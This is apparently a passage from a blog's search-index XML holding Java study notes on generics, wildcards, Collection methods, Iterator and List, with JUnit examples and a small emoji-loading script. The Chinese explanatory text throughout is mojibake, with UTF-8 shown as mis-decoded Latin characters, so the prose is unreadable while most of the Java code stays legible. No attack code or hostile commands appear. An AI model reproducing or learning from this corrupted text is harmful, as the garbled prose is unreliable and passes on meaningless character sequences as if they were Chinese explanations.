//æ­¤æ—¶çš„l1å’Œl2çš„ç±»å‹ä¸å…·æœ‰å­çˆ¶å…³ç³» // l1 = l2; //é”™è¯¯ } @Test public void test1(){ List&lt;String> list1 = null; ArrayList&lt;String> list2 = null; list1 = list2; } } é€šé…ç¬¦çš„ä½¿ç”¨ package cn.xpshuai.java2; import org.junit.Test; import java.util.ArrayList; import java.util.Iterator; import java.util.List; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-28 15:38 * @åŠŸèƒ½ï¼š * * 1.æ³›å‹åœ¨ç»§æ‰¿æ–¹é¢çš„ä½“ç° * * * 2.é€šé…ç¬¦çš„ä½¿ç”¨ * */ public class GenericTest { /* 1.æ³›å‹åœ¨ç»§æ‰¿æ–¹é¢çš„ä½“ç° ç±»Aæ˜¯ç±»Bçš„çˆ¶ç±»ï¼ŒG&lt;A>å’ŒG&lt;B>ä¸å…·å¤‡å­çˆ¶ç±»å…³ç³»ï¼ŒäºŒè€…æ˜¯å¹¶åˆ—å…³ç³» è¡¥å……ï¼šç±»Aæ˜¯ç±»Bçš„çˆ¶ç±»/æ¥å£ï¼ŒA&lt;G>ä¸&lt;G>ä¹Ÿå…·å¤‡å­çˆ¶ç±»/æ¥å£å…³ç³» */ @Test public void test(){ //åœ¨ç±»ä¸Šçš„å±•ç¤º, ç±»ä¼¼å¤šæ€çš„å±•ç¤º Object obj = null; String str = null; obj = str; //åœ¨æ•°ç»„ä¸Šçš„å±•ç¤º Object[] arr1 = null; String[] arr2 = null; arr1 = arr2; // ç¼–è¯‘ä¸é€šè¿‡ List&lt;Object> l1 = null; List&lt;String> l2 = null; //æ­¤æ—¶çš„l1å’Œl2çš„ç±»å‹ä¸å…·æœ‰å­çˆ¶å…³ç³» // l1 = l2; //é”™è¯¯ } @Test public void test1(){ List&lt;String> list1 = null; ArrayList&lt;String> list2 = null; list1 = list2; } /* 2.é€šé…ç¬¦çš„ä½¿ç”¨ é€šé…ç¬¦ï¼š? ç±»Aæ˜¯ç±»Bçš„çˆ¶ç±»ï¼Œä¸”G&lt;A>å’ŒG&lt;B>ä¸å…·å¤‡å­çˆ¶ç±»å…³ç³»ï¼ŒäºŒå…±åŒçš„çˆ¶ç±»æ˜¯: G&lt;?> */ @Test public void test2(){ List&lt;Object> l1 = null; List&lt;String> l2 = null; List&lt;?> list = null; //ä½œä¸ºå‰ä¸¤ä¸ªçš„å…¬å…±çˆ¶ç±»,å®ç°å…¬å…±çš„è°ƒç”¨ list = l1; list = l2; printer(l1); printer(l2); // List&lt;String> list3 = new ArrayList&lt;>(); list3.add("AA"); list3.add("BB"); list3.add("CC"); list = list3; //æ·»åŠ (å†™å…¥)ï¼šå¯¹äºList&lt;?>ï¼Œå°±ä¸èƒ½å‘å…¶å†…éƒ¨æ·»åŠ æ•°æ®äº† //é™¤äº†æ·»åŠ nullä¹‹å¤–, ä»…æ­¤è€Œå·² // list.add("D"); list.add(null); //è·å–(è¯»å–):å…è®¸è¯»å–æ•°æ®ï¼Œè¯»å–çš„æ•°æ®ç±»å‹ä¸ºObject Object o = list.get(0); System.out.println(o); // ä½†æ˜¯æ˜¯å…è®¸è¯»çš„ } // åŠ ä¸Šé€šé…ç¬¦ï¼Œè¿™æ ·å°±å¯ä»¥è°ƒç”¨ä¸€ä¸ªå…¬å…±çš„æ–¹æ³•äº† public void printer(List&lt;?> list){ Iterator&lt;?> iterator = list.iterator(); while (iterator.hasNext()){ Object obj = iterator.next(); System.out.println(obj); } } } æœ‰é™åˆ¶æ¡ä»¶çš„é€šé…ç¬¦çš„ä½¿ç”¨ï¼š /* 3.æœ‰é™åˆ¶æ¡ä»¶çš„é€šé…ç¬¦çš„ä½¿ç”¨ ? extends A: G&lt;? extends A> å¯ä»¥ä½œä¸ºG&lt;A>å’ŒG&lt;B>çš„çˆ¶ç±»ï¼Œå…¶ä¸­Bæ˜¯Açš„å­ç±» ? super A: G&lt;? super A> å¯ä»¥ä½œä¸ºG&lt;A>å’ŒG&lt;B>çš„çˆ¶ç±», å…¶ä¸­G&lt;B>ä¸ºAçš„çˆ¶ç±» */ @Test public void test3(){ //ä»¥Listä¸ºä¾‹ List&lt;? extends Person> l1 = null; // &lt;= List&lt;? super Person> l2 = null; // >= List&lt;Students> l3 = null; List&lt;Person> l4 = null; List&lt;Object> l5 = null; l1 = l3; l1 = l4; // l1 = l5; // l2 = l3; l2 = l4; l2 = l5; } package cn.xpshuai.java2; public class Students extends Person{ } æ³›å‹åº”ç”¨ä¸¾ä¾‹æ³›å‹åµŒå¥—ï¼š list1.forEach(System.out::println) # jdk8æ–°ç‰¹æ€§ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Javaå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>æ³›å‹</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaå­¦ä¹ ä¹‹é›†åˆ]]></title>
    <url>%2Fposts%2F29903%2F</url>
    <content type="text"><![CDATA[è¿™ç« å¾ˆé‡è¦çš„å“¦ Javaé›†åˆæ¡†æ¶æ¦‚è¿° ä¸ºäº†æ–¹ä¾¿å¯¹å¤šä¸ªå¯¹è±¡çš„æ“ä½œï¼Œå°±éœ€è¦å¯¹å¯¹è±¡è¿›è¡Œå­˜å‚¨ ä¸”ä½¿ç”¨Arrayå­˜å‚¨å¯¹è±¡æ–¹é¢å­˜åœ¨ä¸€å®šå¼Šç«¯ã€‚è€ŒJavaé›†åˆå°±åƒä¸€ç§å®¹å™¨ï¼Œå¯ä»¥åŠ¨æ€åœ°æŠŠå¤šä¸ªå¯¹è±¡çš„å¼•ç”¨æ”¾å…¥å®¹å™¨ æ•°ç»„åœ¨å†…å­˜å­˜å‚¨æ–¹é¢çš„ç‰¹ç‚¹: æ•°ç»„åˆå§‹åŒ–ä»¥åï¼Œé•¿åº¦å°±ç¡®å®šäº†ï¼› æ•°ç»„å£°æ˜çš„ç±»å‹ï¼Œå°±å†³å®šäº†è¿›è¡Œå…ƒç´ åˆå§‹åŒ–æ—¶çš„ç±»å‹ã€‚ æ•°ç»„åœ¨å­˜å‚¨æ•°æ®æ–¹é¢çš„å¼Šç«¯: æ•°ç»„åˆå§‹åŒ–ä»¥åï¼Œé•¿åº¦å°±ä¸å¯å˜äº†ï¼Œä¸ä¾¿äºæ‰©å±•ï¼› æ•°ç»„ä¸­æä¾›çš„å±æ€§å’Œæ–¹æ³•å°‘ï¼Œä¸ä¾¿äºè¿›è¡Œæ·»åŠ ã€åˆ é™¤ã€æ’å…¥ç­‰æ“ä½œï¼Œä¸”æ•ˆç‡ä¸é«˜ã€‚åŒæ—¶æ— æ³•ç›´æ¥è·å–å­˜å‚¨å…ƒç´ çš„ä¸ªæ•°ï¼› æ•°ç»„å­˜å‚¨çš„æ•°æ®æ˜¯æœ‰åºçš„ã€å¯ä»¥é‡å¤çš„ã€‚â€”-&gt;å­˜å‚¨æ•°æ®çš„ç‰¹ç‚¹å•ä¸€ Javaé›†åˆå¯åˆ†ä¸ºCollectionå’Œ Map ä¸¤ç§ä½“ç³»: Collectionæ¥å£:å•åˆ—æ•°æ®ï¼Œå®šä¹‰äº†å­˜å–ä¸€ç»„å¯¹è±¡çš„æ–¹æ³•çš„é›†åˆ List: å…ƒç´ æœ‰åºã€å¯é‡å¤çš„é›†åˆ Set: å…ƒç´ æ— åºã€ä¸å¯é‡å¤çš„é›†åˆ Mapæ¥å£:åŒåˆ—æ•°æ®ï¼Œä¿å­˜å…·æœ‰æ˜ å°„å…³ç³»â€œkey-valueå¯¹â€çš„é›†åˆ Javaé›†åˆæ¡†æ¶æ¦‚è¿°ï¼š /** *å­¦å®Œä¹‹åï¼Œæœ€åŸºæœ¬è¦çŸ¥é“ï¼Œä»€ä¹ˆç±»å‹çš„æ•°æ®é€‚åˆç”¨ä»€ä¹ˆæ ·çš„é›†åˆå­˜å‚¨ * * ä¸€ã€é›†åˆæ¡†æ¶çš„æ¦‚è¿° * 1.é›†åˆã€æ•°ç»„éƒ½æ˜¯å¯¹å¤šä¸ªæ•°æ®è¿›è¡Œå­˜å‚¨æ“ä½œçš„ç»“æ„ï¼Œç®€ç§°Javaå®¹å™¨ã€‚ *æ­¤æ—¶çš„å­˜å‚¨ï¼Œä¸»è¦æŒ‡çš„æ˜¯å†…å­˜å±‚é¢çš„å­˜å‚¨ï¼Œä¸æ¶‰åŠæŒä¹…åŒ–çš„å­˜å‚¨(.txtï¼Œjpgï¼Œaviï¼Œæ•°æ®åº“...) * * 2.æ•°ç»„åœ¨å­˜å‚¨å¤šä¸ªæ•°æ®æ–¹é¢çš„ç‰¹ç‚¹ï¼š * > ä¸€æ—¦åˆå§‹åŒ–ï¼Œå…¶é•¿åº¦å°±ç¡®å®šäº† * > æ•°ç»„ä¸€æ—¦å®šä¹‰å¥½ï¼Œå…¶å…ƒç´ çš„ç±»å‹ä¹Ÿå°±ç¡®å®šäº†,å¦‚å…ƒç´ ç±»å‹:String[] arr2; int[] arr1; Object[] arr2; * * 3.ç›¸æ¯”é›†åˆï¼Œæ•°ç»„åœ¨å­˜å‚¨å¤šä¸ªæ•°æ®æ–¹é¢çš„ç‰¹ç‚¹ï¼š * > ä¸€æ—¦åˆå§‹åŒ–ï¼Œå…¶é•¿åº¦å°±ç¡®å®šäº†, æ— æ³•æ‰©å®¹ * > æ•°ç»„ä¸­æä¾›çš„æ–¹æ³•éå¸¸æœ‰é™ï¼Œå¯¹äºæ·»åŠ åˆ é™¤æ’å…¥å…ƒç´ çš„æ“ä½œéå¸¸ä¸æ–¹ä¾¿ï¼ŒåŒæ—¶æ•ˆç‡ä¸é«˜ * > è·å–æ•°ç»„ä¸­å®é™…å…ƒç´ çš„ä¸ªæ•°ï¼Œæ²¡æœ‰ç°æˆçš„å±æ€§æˆ–æ–¹æ³• * > æ•°ç»„å­˜å‚¨æ•°æ®çš„ç‰¹ç‚¹: æœ‰åºã€å¯é‡å¤ï¼Œå¯¹äºæ— åºã€ä¸å¯é‡å¤çš„éœ€æ±‚ä¸å¯æ»¡è¶³ * * * äºŒã€é›†åˆæ¡†æ¶ * | ----- Collectionæ¥å£: å•åˆ—æ•°æ®ï¼Œå®šä¹‰äº†å­˜å–ä¸€ç»„å¯¹è±¡çš„æ–¹æ³•çš„é›†åˆ * |---- Listæ¥å£("åŠ¨æ€æ•°æ®"): å­˜å‚¨å…ƒç´ æœ‰åºã€å¯é‡å¤çš„æ•°æ® * |---- ArrayListã€LinkedListã€Vector(è¿™ä¸‰ä¸ªé¢è¯•å¤š) * |---- Setæ¥å£(ç±»ä¼¼é«˜ä¸­è®²çš„"é›†åˆ":æ— åºã€ç¡®å®šæ€§ã€äº’å¼‚æ€§): å­˜å‚¨å…ƒç´ å…ƒç´ æ— åºã€ä¸å¯é‡å¤ * |---- HashSetã€LinkedHashSetã€TreeSet * | ----- Mapæ¥å£: åŒåˆ—æ•°æ®ï¼Œä¿å­˜å…·æœ‰æ˜ å°„å…³ç³»çš„"key-value"å¯¹çš„é›†åˆ(ç±»ä¼¼é«˜ä¸­å‡½æ•°: y = f(x)ï¼Œä¸åŒkeyå¯ä»¥æŒ‡å‘ç›¸åŒçš„value) * |---- HashMap(é¢è¯•é—®å¾—å¤š)ã€LinkedHashMapã€TreeMapã€Hashtableã€Properties * * * * */ Collectionæ¥å£ å•åˆ—æ•°æ®ï¼Œå®šä¹‰äº†å­˜å–ä¸€ç»„å¯¹è±¡çš„æ–¹æ³•çš„é›†åˆ Collectionæ¥å£çš„æ–¹æ³•/* *ä¸‰ã€Collectionæ¥å£ä¸­çš„æ–¹æ³• * * ç»“è®ºï¼š *å‘Collectionæ¥å£çš„è¯•ä¸‹ç±»çš„æ¥å£ä¸­æ·»åŠ æ•°æ®objæ—¶ï¼Œè¦æ±‚bojæ‰€åœ¨ç±»è¦é‡å†™equals() */ public class MyCollectionTest { /* Collectionæ¥å£ä¸­çš„æ–¹æ³• */ @Test public void test1(){ //è¿™é‡Œä½¿ç”¨ArrayListç”¨å¤šæ€çš„æ–¹æ³•æ¥åšçš„æµ‹è¯• Collection coll = new ArrayList(); // ArrayList æ˜¯æœ‰åºçš„ //1.add(Object e): å°†å…ƒç´ eæ·»åŠ åˆ°é›†åˆä¸­ coll.add("AA"); coll.add("BB"); coll.add(123); //è‡ªåŠ¨è£…ç®± coll.add(new Date()); coll.add(new Person("Tom", 20)); //2.size(): è·å–æ·»åŠ çš„å…ƒç´ çš„ä¸ªæ•° System.out.println(coll.size()); //3.addAll: æŠŠå¦ä¸€é›†åˆä¸­çš„å…ƒç´ æ·»åŠ åˆ°å½“å‰çš„é›†åˆä¸­ Collection coll2 = new ArrayList(); coll.add(456); coll.add("CC"); coll.addAll(coll2); System.out.println(coll); //4.isEmpty(): åˆ¤æ–­å½“å‰é›†åˆæ˜¯å¦ä¸ºç©º(æ˜¯å¦æœ‰å…ƒç´ , sizeæ˜¯å¦ä¸º0) System.out.println(coll.isEmpty()); //5.clear():æ¸…ç©ºé›†åˆå…ƒç´  coll2.clear(); System.out.println(coll2); //6.contains(Object obj): åˆ¤æ–­å½“å‰é›†åˆæ˜¯å¦åŒ…å«obj, åˆ¤æ–­çš„æ˜¯å†…å®¹è€Œä¸æ˜¯åœ°å€ //åœ¨åˆ¤æ–­æ—¶ï¼Œä¼šè°ƒç”¨objå¯¹è±¡æ‰€åœ¨ç±»çš„equals()ï¼Œè¦æ±‚æˆ‘ä»¬è‡ªå·±é‡å†™ä¸€ä¸‹ boolean contains = coll.contains(123); System.out.println(contains); System.out.println(coll.contains(new String("Tom"))); // true, åˆ¤æ–­çš„æ˜¯å†…å®¹, è°ƒç”¨çš„equalsæ–¹æ³• System.out.println(coll.contains(new Person("Tom", 20))); // false, ä½†æ˜¯å¦‚æœæˆ‘ä»¬é‡å†™äº†Personçš„equalsæ–¹æ³•ï¼Œç„¶åå°±å¯ä»¥æŒ‰ç…§è‡ªå·±çš„æƒ³æ³•å˜ä¸ºtrueäº† // 7.containsAll(Collection coll): åˆ¤æ–­å½¢å‚ä¸­çš„æ‰€æœ‰å…ƒç´ æ˜¯å¦éƒ½å­˜åœ¨äºå½“å‰é›†åˆä¸­ // è·Ÿcontainsçš„åˆ¤æ–­æ˜¯ç›¸ç­‰çš„ï¼Œéƒ½è·Ÿå®ç°ç±»ä¸­çš„equals()æœ‰å…³ Collection coll3 = Arrays.asList(123,456); coll.containsAll(coll3); // 8.remove(Object obj): ä»é›†åˆä¸­ç§»é™¤æŸä¸ªå…ƒç´ , æˆåŠŸè¿”å›true // ä»ç„¶éœ€è¦é‡å†™equals()æ–¹æ³•ï¼Œå› ä¸ºåœ¨ç§»é™¤ä¹‹å‰éœ€è¦åˆ¤æ–­å…ƒç´ æ˜¯å¦åœ¨é›†åˆä¸­ coll.remove(123); coll.remove(new Person("Tom", 20)); // åœ¨Personä¸­éœ€é‡å†™equals() // 9.removeAll(Collection coll4): ä»å½“å‰é›†åˆä¸­ç§»é™¤æŸä¸ªé›†åˆä¸­çš„å…ƒç´ (å·®é›†) coll.removeAll(coll3); System.out.println(coll); // 10.retainAll(Collection coll4):è¿”å›å¸ƒå°”å‹çš„å€¼ï¼Œä¿®æ”¹å½“å‰é›†åˆä¸ºä¸¤ä¸ªé›†åˆçš„äº¤é›† Collection coll4 = Arrays.asList(132,789,123); coll.retainAll(coll4); // 11.equals(Object bj): æ¯”è¾ƒä¸¤ä¸ªé›†åˆæ˜¯å¦ç›¸ç­‰ï¼Œä¾æ¬¡é€ä¸ªå…ƒç´ æ¯”è¾ƒ(è¿™é‡ŒArrayListæ˜¯æœ‰åºçš„ï¼Œæ‰€ä»¥é¡ºåºä¸ä¸€æ ·ä¹Ÿä¸è¡Œ) System.out.println(coll.equals(coll3)); // 12.hashCode(): è¿”å›å½“å‰å¯¹è±¡çš„hashå€¼ System.out.println(coll.hashCode()); // 13.é›†åˆ --> æ•°ç»„: toArray() Object[] arr = coll.toArray(); for (int i = 0; i &lt; arr.length; i++) { System.out.println(arr[i]); } // 14.æ•°ç»„ --> é›†åˆ: è°ƒç”¨Arraysç±»çš„é™æ€æ–¹æ³•asList() List&lt;String> li = Arrays.asList(new String[]{"AA", "BB", "CC"}); System.out.println(li); //Note: ä½¿ç”¨æ—¶å€™æ³¨æ„ List arr1 = Arrays.asList(new int[]{111,222}); //è¿™ç§å†™æ³•ä¼šè¢«å½“åšä¸€ä¸ªå…ƒç´  List arr2 = Arrays.asList(111,222); //ç›´æ¥å†™è¿™å°±è¡Œ List arr3 = Arrays.asList(new Integer[]{111,222}); //æˆ–è€…ç”¨Integer System.out.println(arr1.size()); System.out.println(arr2.size()); System.out.println(arr3.size()); // 15.iterator: è¿”å›Iteratoræ¥å£çš„å®ä¾‹ï¼Œç”¨äºéå†é›†åˆå…ƒç´ ï¼Œä¸‹ä¸€éƒ¨åˆ†æ¥æµ‹è¯• } } lteratorè¿­ä»£å™¨æ¥å£ lteralorå¯¹è±¡ç§°ä¸ºè¿­ä»£å™¨(è®¾è®¡æ¨¡å¼çš„ä¸€ç§)ï¼Œä¸»è¦ç”¨äºéå†Collectioné›†åˆä¸­çš„å…ƒç´ ã€‚ GOFç»™è¿­ä»£å™¨æ¨¡å¼çš„å®šä¹‰ä¸º:æä¾›ä¸€ç§æ–¹æ³•è®¿é—®ä¸€ä¸ªå®¹å™¨(container)å¯¹è±¡ä¸­å„ä¸ªå…ƒç´ ï¼Œè€Œåˆä¸éœ€æš´éœ²è¯¥å¯¹è±¡çš„å†…éƒ¨ç»†èŠ‚ã€‚è¿­ä»£å™¨æ¨¡å¼ï¼Œå°±æ˜¯ä¸ºå®¹å™¨è€Œç”Ÿã€‚ç±»ä¼¼äºâ€œå…¬äº¤è½¦ä¸Šçš„å”®ç¥¨å‘˜â€ã€â€œç«è½¦ä¸Šçš„ä¹˜åŠ¡å‘˜â€ã€â€œç©ºå§â€ã€‚ Collectionæ¥å£ç»§æ‰¿äº†java.lang.lterableæ¥å£ï¼Œè¯¥æ¥å£æœ‰ä¸€ä¸ªiterator()æ–¹æ³•ï¼Œé‚£ä¹ˆæ‰€æœ‰å®ç°äº†Collectionæ¥å£çš„é›†åˆç±»éƒ½æœ‰ä¸€ä¸ªiterator()æ–¹æ³•ï¼Œç”¨ä»¥è¿”å›ä¸€ä¸ªå®ç°äº†lteratoræ¥å£çš„å¯¹è±¡ã€‚ Iteratorä»…ç”¨äºéå†é›†åˆï¼Œlteratoræœ¨èº«å¹¶ä¸æä¾›æ‰¿è£…å¯¹è±¡çš„èƒ½åŠ›ã€‚å¦‚æœéœ€è¦åˆ›å»ºlteratorå¯¹è±¡ï¼Œåˆ™å¿…é¡»æœ‰ä¸€ä¸ªè¢«è¿­ä»£çš„é›†åˆã€‚ é›†åˆå¯¹è±¡æ¯æ¬¡è°ƒç”¨iterator()æ–¹æ³•éƒ½å¾—åˆ°ä¸€ä¸ªå…¨æ–°çš„è¿­ä»£å™¨å¯¹è±¡ï¼Œé»˜è®¤æ¸¸æ ‡éƒ½åœ¨é›†åˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¹‹å‰ã€‚ Iteratorè¿­ä»£å™¨æ¥å£remove()æ–¹æ³• Iterator iterator2 = coll.iterator(); while (iterator2.hasNext()){ Object obj = iterator2.next(); if("Tom".equals(obj)){ iterator2.remove(); } } Note: lteratorå¯ä»¥åˆ é™¤é›†åˆçš„å…ƒç´ ï¼Œä½†æ˜¯æ˜¯éå†è¿‡ç¨‹ä¸­é€šè¿‡è¿­ä»£å™¨å¯¹è±¡çš„removeæ–¹æ³•ï¼Œä¸æ˜¯é›†åˆå¯¹è±¡çš„removeæ–¹æ³•ã€‚ å¦‚æœè¿˜æœªè°ƒç”¨next)æˆ–åœ¨ä¸Šä¸€æ¬¡è°ƒç”¨nextæ–¹æ³•ä¹‹åå·²ç»è°ƒç”¨äº†removeæ–¹æ³•ï¼Œå†è°ƒç”¨removeéƒ½ä¼šæŠ¥llegalStateExceptionã€‚ /* é›†åˆå…ƒç´ çš„éå†æ“ä½œï¼Œä½¿ç”¨Iterator(è¿­ä»£å™¨æ¥å£) 1.å†…éƒ¨çš„æ–¹æ³•ï¼šhasNext()ä¸next()é…åˆå»ä½¿ç”¨ 2.æ¯æ¬¡è°ƒç”¨iterator()ï¼Œå°±ä¼šæ˜¯ä¸€ä¸ªå…¨æ–°çš„è¿­ä»£å™¨å¯¹è±¡ï¼ŒæŒ‡é’ˆæ°¸è¿œæŒ‡å‘å¼€å¤´ 3.å†…éƒ¨å®šä¹‰äº†remove(),å¯ä»¥åœ¨éå†çš„æ—¶å€™ï¼Œåˆ é™¤é›†åˆä¸­çš„å…ƒç´ ã€‚æ­¤æ–¹æ³•ä¸åŒäºé›†åˆç›´æ¥ä½¿ç”¨remove() 4.åœ¨è°ƒç”¨next()ä¹‹å‰ï¼Œä¸è¦è°ƒç”¨remove()ï¼›ç§»é™¤é›†åˆä¸­æŸå…ƒç´ çš„æ“ä½œ, ä¸èƒ½å†™ä¸¤æ¬¡ */ @Test public void test2(){ Collection coll = new ArrayList(); coll.add("AA"); coll.add("BB"); coll.add(123); coll.add(new Date()); coll.add(new Person("Tom", 20)); Iterator iterator = coll.iterator(); // è£…ä¸œè¥¿çš„è¿˜æ˜¯åŸæ¥çš„é›†åˆï¼ŒIteratorå¹¶ä¸æ˜¯å®¹å™¨ï¼Œåªæ˜¯è¿­ä»£å™¨ // next() // System.out.println(iterator.next()); // ä¸æ¨èè¿™ä¹ˆå†™ // for (int i = 0; i &lt; coll.size(); i++) { // System.out.println(iterator.next()); // } // ã€æ¨èå†™æ³•ã€‘: // hasNext() ä¸ next()é…åˆ while (iterator.hasNext()){ // next(): 1.æŒ‡é’ˆå…ˆä¸‹ç§»ï¼›2.å°†ä¸‹ç§»ä»¥åé›†åˆä½ç½®ä¸Šçš„å…ƒç´ è¿”å› System.out.println(iterator.next()); } //é”™è¯¯å†™æ³•1: // while (iterator.next() != null){ //è¿™é‡Œå…ˆæŒ‡é’ˆä¸‹ç§»äº†ï¼Œæ‰€ä»¥ä¼šè·³ç€è¾“å‡ºï¼Œä¸”ä¼šå‡ºç°NoSuchElementException // System.out.println(iterator.next()); // } //é”™è¯¯å†™æ³•2ï¼š // æ¯æ¬¡è°ƒç”¨iterator()ï¼Œå°±ä¼šæ˜¯ä¸€ä¸ªå…¨æ–°çš„è¿­ä»£å™¨å¯¹è±¡ï¼ŒæŒ‡é’ˆæ°¸è¿œæŒ‡å‘å¼€å¤´ // while ((coll.iterator()).hasNext()){ //æ­»å¾ªç¯ï¼Œä¸æ–­è¾“å‡ºç¬¬ä¸€ä¸ªå…ƒç´  // System.out.println(iterator.next()); // } //ä½¿ç”¨Iteratorä¸­çš„remove() Iterator iterator2 = coll.iterator(); while (iterator2.hasNext()){ Object obj = iterator2.next(); // åœ¨è°ƒç”¨next()ä¹‹å‰ï¼Œä¸è¦è°ƒç”¨remove() if("Tom".equals(obj)){ iterator2.remove(); //ç§»é™¤é›†åˆä¸­æŸå…ƒç´ çš„æ“ä½œ, ä¸èƒ½å†™ä¸¤æ¬¡ } } //ç„¶åå†æŸ¥çœ‹ä¸€ä¸‹removeä¹‹åçš„å…ƒç´  Iterator iterator3 = coll.iterator(); while (iterator3.hasNext()){ System.out.println(iterator3.next()); } } foreachå¾ªç¯éå†é›†åˆå’Œæ•°ç»„å…ƒç´ /* foreach å¾ªç¯éå†é›†åˆå’Œæ•°ç»„å…ƒç´  jdk5æ–°å¢ */ @Test public void test3(){ Collection coll = new ArrayList(); coll.add("AA"); coll.add("BB"); coll.add(123); coll.add(new Date()); coll.add(new Person("Tom", 20)); // foreach å¾ªç¯éå†é›†åˆ // æ ¼å¼: for(é›†åˆ/æ•°ç»„ä¸­å…ƒç´ çš„ç±»å‹ å±€éƒ¨å˜é‡: é›†åˆ/æ•°ç»„å¯¹è±¡) // å†…éƒ¨ä»ç„¶è°ƒç”¨äº†è¿­ä»£å™¨ for(Object obj: coll){ System.out.println(obj); } // foreach å¾ªç¯éå†æ•°ç»„ int[] arr1 = new int[]{11,22,33,44,55}; for(int i: arr1){ System.out.println(i); } //ç»ƒä¹ é¢˜ï¼š java.lang.String[] arrr = new java.lang.String[]{"MM", "MM", "MM"}; //F1:æ™®é€šforå¾ªç¯ for (int i = 0; i &lt; arrr.length; i++) { arrr[i] = "GG"; } for (int i = 0; i &lt; arrr.length; i++) { System.out.println(arrr[i]); // GG } // F2:foreach for(java.lang.String s: arrr){ s ="GG"; //å–å‡ºæ¥ï¼Œç»™sï¼ŒsæŠŠå®ƒç»™æ”¹äº†ï¼Œä¸ä¼šä¿®æ”¹åŸæœ‰æ•°ç»„çš„å€¼ } for (int i = 0; i &lt; arrr.length; i++) { System.out.println(arrr[i]); // MM } } ### Collectionå­æ¥å£ä¸€: List(é‡ç‚¹) å…ƒç´ æœ‰åºã€å¯é‡å¤çš„é›†åˆ çœ‹åšâ€åŠ¨æ€æ•°ç»„â€ï¼Œä»¥åå¯ä»¥ç”¨è¿™ä¸ªæ¥ä»£æ›¿æ•°ç»„å•¦~ Listæ¥å£æ¦‚è¿°ï¼š é‰´äºJavaä¸­æ•°ç»„ç”¨æ¥å­˜å‚¨æ•°æ®çš„å±€é™æ€§ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨Listæ›¿ä»£æ•°ç»„ Listé›†åˆç±»ä¸­å…ƒç´ æœ‰åºã€ä¸”å¯é‡å¤ï¼Œé›†åˆä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æœ‰å…¶å¯¹åº”çš„é¡ºåºç´¢å¼•ã€‚ Listå®¹å™¨ä¸­çš„å…ƒç´ éƒ½å¯¹åº”ä¸€ä¸ªæ•´æ•°å‹çš„åºå·è®°è½½å…¶åœ¨å®¹å™¨ä¸­çš„ä½ç½®ï¼Œå¯ä»¥æ ¹æ®åºå·å­˜å–å®¹å™¨ä¸­çš„å…ƒç´ ã€‚ JDK APIä¸­Listæ¥å£çš„å®ç°ç±»å¸¸ç”¨çš„æœ‰: ArrayListã€LinkedListå’ŒVectorã€‚ æºç åˆ†æ(è‡ªå·±çœ‹) Listæ¥å£å¸¸ç”¨æ–¹æ³•ï¼š é™¤å»Collectionè¿™ç§çš„15ä¸ªï¼Œè¿˜æœ‰ä¸‹é¢å‡ ä¸ª ã€æ€»ç»“ï¼šå¸¸ç”¨æ–¹æ³•ã€‘ å¢ï¼šadd(Object obj) åˆ ï¼šremove(int index) /remove(Object obj) æ”¹ï¼šset(int index, Object ele) æŸ¥ï¼šget(int index) æ’ï¼šadd(index, Object ele) é•¿åº¦ï¼šsize() éå†ï¼š1. Iteratorè¿­ä»£å™¨ 2. foreach 3. æ™®é€šçš„å¾ªç¯ å¦‚ä¸‹ï¼š package cn.xpshuai.java1; import org.junit.Test; import java.util.*; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-26 16:44 * @åŠŸèƒ½ï¼š Collectionå­æ¥å£ä¸€: List * * ä¸€ã€listæºç æ¡†æ¶ * |---- Listæ¥å£: å­˜å‚¨å…ƒç´ æœ‰åºã€å¯é‡å¤çš„æ•°æ® --> "åŠ¨æ€"æ•°ç»„ï¼Œæ›¿æ¢åŸæœ‰æ•°ç»„ * |---- ArrayList: ä½œä¸ºListæ¥å£çš„ä¸»è¦å®ç°ç±»(ä¸€èˆ¬å°±ç”¨å®ƒ):çº¿ç¨‹ä¸å®‰å…¨çš„(ä½†æ˜¯ç”¨çš„æ—¶å€™ä¸€èˆ¬éƒ½æ‰”åˆ°synchronizedList()é‡Œé¢å°±çº¿ç¨‹å®‰å…¨äº†)ï¼Œæ•ˆç‡é«˜ï¼šåº•å±‚ä½¿ç”¨Object[]å­˜å‚¨ * |----LinkedList: å…¶æ¬¡ä½¿ç”¨çš„, å¯¹äºé¢‘ç¹çš„æ’å…¥å’Œåˆ é™¤æ“ä½œï¼Œä½¿ç”¨æ­¤ç±»æ•ˆç‡æ¯”ArrayListé«˜ï¼Œåº•å±‚ä½¿ç”¨åŒå‘é“¾è¡¨å­˜å‚¨ * |----Vector: ä½œä¸ºListæ¥å£çš„å¤è€å®ç°ç±»: çº¿ç¨‹å®‰å…¨çš„ï¼Œæ•ˆç‡ä½ï¼šåº•å±‚ä½¿ç”¨Object[] elemDataå­˜å‚¨ * * Listå¸¸ç”¨çš„æ¥å£å¼‚åŒï¼š * - ArrayList * - LinkedList * - Vector * åŒï¼šéƒ½å®ç°äº†listæ¥å£ï¼Œå­˜å‚¨æ•°æ®çš„ç‰¹ç‚¹ç›¸åŒï¼šå­˜å‚¨æœ‰åºçš„ã€å¯é‡å¤çš„æ•°æ® * ä¸åŒï¼š * * * äºŒã€æºç åˆ†æï¼š * 1.ArrayList: * jdk7æƒ…å†µä¸‹: * ArrayList list = new ArrayList(); //åº•å±‚åˆ›å»ºäº†é•¿åº¦æ˜¯10çš„Object[]æ•°ç»„elementData * list.add(123);//elementData[0]=new Integer(123); * ... * list.add(11);//list.add(11);//å¦‚æœæ­¤æ¬¡çš„æ·»åŠ å¯¼è‡´åº•å±‚elementDataæ•°ç»„å®¹é‡ä¸å¤Ÿï¼Œåˆ™æ‰©å®¹ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰©å®¹ä¸ºåŸæ¥çš„å®¹é‡çš„1.5å€, 